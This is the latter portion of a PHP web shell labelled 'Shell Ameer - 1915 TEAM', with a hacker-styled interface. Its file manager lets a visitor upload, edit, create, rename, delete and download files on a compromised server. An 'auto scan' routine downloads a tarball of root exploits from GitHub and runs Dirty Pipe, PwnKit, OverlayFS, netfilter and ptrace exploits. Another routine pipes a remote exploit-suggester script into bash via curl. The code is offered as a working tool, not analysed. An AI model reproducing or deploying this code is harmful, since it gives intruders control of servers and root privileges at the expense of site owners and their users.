				echo '<strong>Upload</strong> fail! '.er().'</div>';
				}
			}else{
			echo "<strong>Upload</strong> $result ok! ".ok()."</div>";
			}
		}
		echo "
		<div class='card-card-body-text-dark-input-group-mb-3'>
		<u>Multiple upload</u>
			<form method='POST' enctype='multipart/form-data'>
				<div class='input-group'>
					<input class='form-control-form-control-sm' type='file' name='file[]' multiple='' $_r><br>
					<input class='btn-btn-dark-btn-sm' type='submit' name='upl' value='upload'>
				</div>
			</form>
		</div>";
			}
		}
		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
			ob_implicit_flush();ob_end_flush();s();
			echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn-btn-outline-light-btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=autoscan'><i class='bi bi-bug'></i> Auto scan</a>
					<a class='btn-btn-outline-light-btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=scansd'><i class='bi bi-search'></i> Scan SUID</a>
					<a class='btn-btn-outline-light-btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=esg'><i class='bi bi-search'></i> Exploit suggester</a>
				</div>
			</div>";if (!$GLOBALS['fungsi'][5]("proc_open")) {
				echo "<center class='anu'>Command is Disabled !</center>";
			}
			if (!is_writable($path)) {
				echo "<center class='anu'>Current Directory is Unwriteable !</center>";
			}
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/rooting/")) {
					mkdir($path."/rooting");
					exe_root("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz", $path."/rooting");
					exe_root("tar -xf auto.tar.gz", $path."/rooting");
					if (!file_exists($path."/rooting/netfilter")) {
						die("<center class='anu'>Failed to Download Material !</center>");
					}
				}
				echo '
				<div class="container-fluid-language-javascript">
					<div class="shell-mb-3">
						<pre style="font-size:15px;"><code>Netfilter : '.exe_root("timeout 10 ./rooting/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./rooting/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./rooting/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/rooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/rooting").@exe("rm -rf ./rooting | timeout 10 ").'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">[+] Scanning ...</center>';
				echo '
				<div class="container-fluid-language-javascript">
					<div class="shell-mb-3">
						<pre style="font-size:15px;"><code>'.exe_root("find / -perm -u=s -type f 2>/dev/null", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
				echo '<center class="anu">[+] Loading ...</center>';
				echo '
				<div class="container-fluid-language-javascript">
					<div class="shell-mb-3">
						<pre style="font-size:15px;"><code>'.exe_root("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path).'</code></pre>
					</div>
				</div>';
			}
		}
		// openfile
		if(isset($_7['opn'])) {
			$file = $_7['opn'];
		}	
		// view
		if($_7['action'] == 'view') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'>View</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'>Edit</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'>Rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'>delete_file</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'>Download</i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<div class='bg-dark'>
			<div class='container-fluid-language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars($fungsi[0]($file))."</textarea>
			</div>
		</div>";
		}
		// edit
		if(isset($_7['edit_file'])) {
		$updt = fopen("$file", "w");
		$result = fwrite($updt, $_7['contents']);		
			if ($result) {
		echo '<strong>Edit file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Edit file</strong> fail! '.er().'</div>';}
		}
		if($_7['action'] == 'edit') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'>view</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'>edit</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'>rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'>delete</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'>download</i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>".htmlspecialchars($fungsi[0]($file))."</textarea>
			<div class='d-grid gap-2'>
				<button class='btn-btn-outline-light-btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i>Edit</button>
			</div>
		</form>";
		}
		if($_7['action'] == 'rename_folder') {
			if($_7['r_d']) {
				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
				if($r_d) {
		echo '<strong>Rename folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}else{
		echo '<strong>Rename folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		s();
		echo "
		<div class='btn-group'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'>rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'>delete</i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
				<button class='btn-btn-outline-light-btn-sm' type='submit'><i class='bi bi-arrow-return-right'>Exute</i></button>
			</div>
		</form>";
		}
		if(isset($_7['r_f'])) {
			$old = $file;
			$new = $_7['new_name'];
			rename($new, $old);
			if(file_exists($new)) {
		echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
			<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
			}else{
		if(rename($old, $new)) {
		echo '<strong>Rename file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Rename file</strong> fail! '.er().'</div>';
				}
			}
		}
		if($_7['action'] == 'rename') {
		s();
		echo "
		<div class='btn-group'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'>view</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'>edit</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'>rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'>delete_file</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'>download</i></a>
		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."' $_r>
				<button class='btn-btn-outline-light-btn-sm' type='sumbit' name='r_f'><i class='bi bi-arrow-return-right'></i>Rname</button>
			</div>
		</form>";
		}
		if ($_7['action'] == 'delete_file') {
		s();
		if ($_7['yeahx']) {
			$delete = $GLOBALS['fungsi'][4]($file);
			if ($delete) {
		echo '<strong>Delete file</strong> ok! '.ok().'</div>';
			}else{
		echo '<strong>Delete file</strong> fail! '.er().'</div>';
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'><i class='bi bi-eye-fill'>view</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$file'><i class='bi bi-pencil-square'>edit</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$file'><i class='bi bi-pencil-fill'>rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$file'><i class='bi bi-trash-fill'>delete_file</i></a>
			<a class='btn btn-outline-lightbtn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$file'><i class='bi bi-download'>download</i></a>
		</div>
		<div class='card-card-body-text-dark-input-group-mb-3'>
			<p>Are you sure to delete : ".basename($file)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=".hex($dir)."'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		//delete folder
		if ($_7['action'] == 'delete_folder' ) {
		s();
		if ($_7['yeah']) {
			if($fungsi[1]($dir)) {
			if(is_writable($dir)) {
				@rmdir($dir);
				@exe("rm -rf $dir");
				@exe("rmdir /s /q $dir");
		echo '<strong>Delete folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				} else {
		echo '<strong>Delete folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		}
		echo "
		<div class='btn-group mb-3'>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'>rename</i></a>
			<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'>delete</i></a>
		</div>
		<div class='card-card-body-text-dark-input-group-mb-3'>
			<p>Are you sure to delete : ".basename($dir)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=".dirname($dir)."'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		if(isset($_7['filenew'])) {
		s();
		if(isset($_7['bikin'])){
			$name = $_7['name_file'];
			$contents_file = $_7['contents_file'];
			foreach ($name as $name_file){
				$handle = @fopen("$name_file", "w");
				if($contents_file){
					$create = @fwrite($handle, $contents_file);
				} else {
					$create = $handle;
				}
			}
			if($create){
				echo "<script>window.location='?path=".hex($path)."'</script>";
			} else {
				echo '<strong>Create file</strong> fail! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control-form-control-sm' type='text' name='name_file[]' placeholder='filename' $_r>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control-form-control-sm' name='contents_file' rows='7' placeholder='your script' $_r></textarea>
				<div class='d-grid gap-2'>
					<input class='btn-btn-outline-light-btn-sm' type='submit' name='bikin' value='create'>
				</div>
			</form>
		</div>";
		}
		if(isset($_7['dirnew'])) {
		s();
		if(isset($_7['create'])){
			$name = $_7['name_dir'];
			foreach ($name as $name_dir){
				$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $name_dir);
				$fd = @mkdir ($folder);
			}
			if($fd){
				echo "<script>window.location='?path=".hex($path)."'</script>";
			} else {
				echo '<strong>Create dir</strong> fail! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Name directory:
				<div class='input-group-mb-3'>
					<input class='form-control-form-control-sm' type='text' name='name_dir[]' placeholder='Dir name' $_r>
					<input class='btn-btn-outline-light-btn-sm' type='submit' name='create' value='create dir'>
				</div>
			</form>
		</div>";
		}
		echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">name</td><td class="text-center">type</td>
				<td class="text-center">last edit</td>
				<td class="text-center">size</td>
				<td class="text-center">owner<gr>/</gr>group</td>
				<td class="text-center">permsion</td>
			<td class="text-center">action</td>
		</tr>
		</thead>
		<tbody class="text-nowrap"><center>
		<tr>
			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn-btn-outline-light-btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill">mk file</i></a>
					<a class="btn-btn-outline-light-btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus">mkdir</i></a>
				</div>
			</td>
		</tr>';		
		foreach($scand as $dir){
			$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
			if(strlen($dir) > 25) {
				$_d = substr($dir, 0, 25)."...";		
			}else{
				$_d = $dir;
			}
			if($GLOBALS['fungsi'][5]('posix_getpwuid')) {
				$downer = @posix_getpwuid(fileowner("$path/$dir"));
				$downer = $downer['name'];
			} else {
				$downer = fileowner("$path/$dir");
			}
			if($GLOBALS['fungsi'][5]('posix_getgrgid')) {
				$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
				$dgrp = $dgrp['name'];
			} else {
				$dgrp = filegroup("$path/$dir");
			}
			if(!$fungsi[1]($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			}else{
				$size = $size.' KB';
			}
		if(!$fungsi[1]($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
		echo "
		<tr>
			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($path.'/'.$dir)."'>$_d</a></td>
			<td class='text-center'>dir</td>
			<td class='text-center'>$dt</td>
			<td class='text-center'>-</td>
			<td class='text-center'>$downer<gr>/</gr>$dgrp</td>
			<td class='text-center'>";
				if(is_writable($path.'/'.$dir)) echo '<gr>';
					elseif(!is_readable($path.'/'.$dir)) echo '<rd>';
				echo p($path.'/'.$dir);
				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
		echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=rename_folder'><i class='bi bi-pencil-fill'>rename</i></a><a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=delete_folder'><i class='bi bi-trash-fill'>Delete</i></a>
			</div>
			</td>
		</tr>";
		}
		foreach($scand as $file){
			$ft = date("Y-m-d G:i", filemtime("$path/$file"));
			if($GLOBALS['fungsi'][5]('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$path/$file"));
				$fowner = $fowner['name'];
			} else {
				$fowner = fileowner("$path/$file");
			}
			if($GLOBALS['fungsi'][5]('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$path/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$path/$file");
			}
			if(!$fungsi[3]($path.'/'.$file)) continue;
			if(strlen($file) > 25) {
				$_f = substr($file, 0, 25)."...-.".$ext;		
			}else{
				$_f = $file;
			}
		echo "
		<tr>
		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
			<td class='text-center'>file</td>
			<td class='text-center'>$ft</td>
			<td class='text-center'>".sz(filesize($file))."</td>
			<td class='text-center'>$fowner<gr>/</gr>$fgrp</td>
			<td class='text-center'>";if(is_writable($path.'/'.$file)) echo '<gr>';
			elseif(!is_readable($path.'/'.$file)) echo '<rd>';
				echo p($path.'/'.$file);
			if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</gr></rd></td>';
			echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i>view</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i>edit</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i>rename</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i>delete</a>
				<a class='btn-btn-outline-light-btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'>download</i></a>
			</div>
			</td>
		</tr>";
		}
		?>
		</center></tbody>
		</table><br><br><br><br><br><br>
		<center></div><div class='text-secondary'>Shell Ameer  - 1915 TEAM </div></center>
	</div>
	<style>
        /* General Body Styling */
        body {
            background-color: #121212;
            font-family: 'Share Tech Mono', monospace;
            color: #00FF00;
            margin: 5;
            padding: 0;
        }

        /* Flickering Text Animation */
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        h1, h4 {
            color: #00FF00;
            font-size: 1.8em;  /* Smaller font size */
            text-align: center;
            text-transform: uppercase;
            animation: flicker 2s infinite;
            text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00;
        }

        /* Navigation Links Styling */
        .text-light, .btn-group a {
            text-decoration: none;
            color: #00FF00;
            font-size: 1em;  /* Smaller font size */
            text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00;
        }

      .btn-group a:hover {
            color: #FF5733;
            transform: scale(1.1);
            transition: all 0.3s ease;
            text-shadow: 0 0 15px #FF5733, 0 0 30px #FF5733;
        }

        /* Button Group Styling */
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;  /* Reduced gap */
            justify-content: center;
            padding: 8px 0;  /* Reduced padding */
        }

        .btn-btn-outline-light-btn-sm {
            background-color: transparent;
            border: 1px solid #00FF00;
            color: #00FF00;
            padding: 6px 12px;  /* Reduced padding */
            border-radius: 5px;
            font-size: 0.9em;  /* Smaller font size */
            cursor: pointer;
            box-shadow: 0 0 10px #00FF00;
            transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
        }

        .btn-btn-outline-light-btn-sm:hover {
            background-color: #00FF00;
            color: #121212;
            box-shadow: 0 0 20px #FF5733;
        }

        /* Table Styling */
        input button table {
            width: 100%;
            margin-top: 10px;
            border-collapse: collapse;
            color: #00FF00;
            text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00;
        }

        th, td {
            padding: 8px;  /* Reduced padding */
            text-align: center;
            border: 1px solid #00FF00;
        }

        th {
            background-color: #333;
        }

        /* Container and Shadow Effects */
        .card-card-body-text-dark-input-group-mb-3 .bg-dark {
            background-color: #1a1a1a;
            padding: 15px;  /* Reduced padding */
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
            margin-bottom: 15px;  /* Reduced margin */
        }

        .container-fluid {
            margin: 0;
            padding: 15px;  /* Reduced padding */
            font-size: 1em;  /* Smaller font size */
        }

        /* Textarea Styling */
        textarea {
            background-color: #121212;
            border: 1px solid #00FF00;
            color: #00FF00;
            width: 100%;
            padding: 8px;  /* Reduced padding */
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;  /* Smaller font size */
            resize: none;
            outline: none;
            box-shadow: 0 0 10px #00FF00;
        }

        textarea:focus {
            border-color: #FF5733;
            box-shadow: 0 0 20px #FF5733;
        }

        /* Center Content */
        .center {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        /* Animation for Buttons */
        .btn-btn-outline-light-btn-sm {
            position: relative;
            animation: glow 1.5s ease-in-out infinite;
        }

        @keyframes glow {
            0% { text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00; }
            50% { text-shadow: 0 0 20px #00FF00, 0 0 30px #00FF00, 0 0 50px #00FF00; }
            100% { text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00; }
        }

        /* Adding Shadow to Folders and Files */
        .bi-folder2-open, .bi-file-earmark-text-fill {
            font-size: 1.5em;  /* Reduced size */
            margin-right: 8px;  /* Reduced margin */
            animation: spin 5s infinite linear;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
		.card-card-body-text-dark-input-group-mb-3 {
            background-color: #222;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            width: 80%;
            max-width: 500px;
        }

        u {
            color: #00ff00;
            font-size: 1.5em;
            text-decoration: underline;
            display: block;
            text-align: center;
            margin-bottom: 20px;
        }

        /* ستايل الفورم */
        .input-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .form-control-form-control-sm {
            background-color: #333;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            font-size: 1.2em;
            width: 80%;
            border-radius: 5px;
            transition: all 0.3s ease-in-out;
        }

        .form-control-form-control-sm:focus {
            outline: none;
            border-color: #ff00ff;
            box-shadow: 0 0 10px #ff00ff;
        }

        .btn-btn-dark-btn-sm {
            background-color: #00ff00;
            color: #1a1a1a;
            padding: 10px 20px;
            font-size: 1.2em;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
        }

        .btn-btn-dark-btn-sm:hover {
            background-color: #ff00ff;
            color: #1a1a1a;
            transform: scale(1.1);
        }

        /* تأثير الحركة */
        .form-control-form-control-sm,
        .btn-btn-dark-btn-sm {
            opacity: 0;
            animation: fadeIn 1s forwards;
        }

        .form-control-form-control-sm:nth-child(1) {
            animation-delay: 0.5s;
        }

        .btn-btn-dark-btn-sm {
            animation-delay: 1s;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

a{
		text-decoration: none;
            color: #00FF00;
            font-size: 1em;  /* Smaller font size */
            text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00;
}













		.card-header {
            background-color: #1a1a1a;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(0, 255, 0, 0.3);
            padding: 20px;
            width: 100%;
            max-width: 600px;
            margin: 50px auto;
            border: 2px solid #00FF00;
        }

        u {
            text-decoration: underline;
            color: #00FF00;
        }

        h5 {
            color: #00FF00;
            font-size: 18px;
            margin-top: 20px;
            font-weight: bold;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .form-control {
            background-color: #333;
            color: #00FF00;
            border: 1px solid #00FF00;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
        }

        .btn-sm {
            background-color: #333;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 10px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            border-radius: 5px;
        }

        .btn-sm:hover {
            background-color: #00FF00;
            color: #121212;
            border: 1px solid #121212;
        }

        .btn-block {
            display: block;
            width: 100%;
        }

        /* تحسين شكل زر submit */
        .btn-btn-dark-btn-sm {
            background: linear-gradient(45deg, #00FF00, #32CD32);
            color: #121212;
            border: 2px solid #00FF00;
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 10px;
            transition: all 0.4s ease-in-out;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }

        .btn-btn-dark-btn-sm:hover {
            background: linear-gradient(45deg, #32CD32, #00FF00);
            color: #121212;
            border: 2px solid #32CD32;
            box-shadow: 0 0 25px rgba(50, 205, 50, 1);
            transform: scale(1.05); /* تكبير الزر عند المرور عليه */
        }

        .btn-btn-dark-btn-sm:active {
            background: #00FF00;
            color: #121212;
            box-shadow: 0 0 30px rgba(0, 255, 0, 1);
            transform: scale(0.98); /* تقليص الزر عند الضغط عليه */
        }

        select {
            background-color: #333;
            color: #00FF00;
            border: 1px solid #00FF00;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-size: 14px;
        }

        .d-grid {
            display: grid;
            gap: 10px;
        }

        .d-grid .btn-block {
            transition: all 0.3s ease;
        }

        /* Glow effect for input fields */
        .form-control:focus, .btn-sm:focus, select:focus {
            outline: none;
            border-color: #00FF00;
            box-shadow: 0 0 10px #00FF00;
        }

        /* Add some subtle animation for hacker vibe */
        @keyframes flicker {
            0% { opacity: 0.5; }
            25% { opacity: 1; }
            50% { opacity: 0.5; }
            75% { opacity: 1; }
            100% { opacity: 0.5; }
        }

        u {
            animation: flicker 2s infinite;
        }
	
    </style>

    </style>
</div></body></html>

<head>
</body>
</html>
